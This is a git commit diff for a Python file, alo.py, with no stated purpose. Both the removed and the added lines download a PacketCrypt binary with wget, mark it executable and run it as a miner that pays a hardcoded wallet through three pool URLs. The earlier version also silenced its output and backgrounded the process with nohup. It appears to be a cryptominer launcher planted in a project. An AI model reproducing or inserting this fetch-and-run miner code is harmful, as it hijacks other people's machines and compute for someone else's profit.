3f3a96dcf8e3814e3ac351c2434f525a2930b035
aurbach55 <95366868+aurbach55@users.noreply.github.com>
2022-03-31 18:11:28 +0700

    Update alo.py

--- alo.py
+++ alo.py
@@ -1,7 +1,7 @@
 import os
-cmd = os.system('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O data >/dev/null 2>&1')
-cmd = os.system('chmod +x data >/dev/null 2>&1')
-cmd = os.system('nohup ./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkteer.com http://pool.pkt.world http://pool.pktpool.io > nohup.out')
+os.system ('wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64 -O data')
+os.system ('chmod +x data')
+os.system ('./data ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkteer.com http://pool.pkt.world http://pool.pktpool.io')
 
 
 
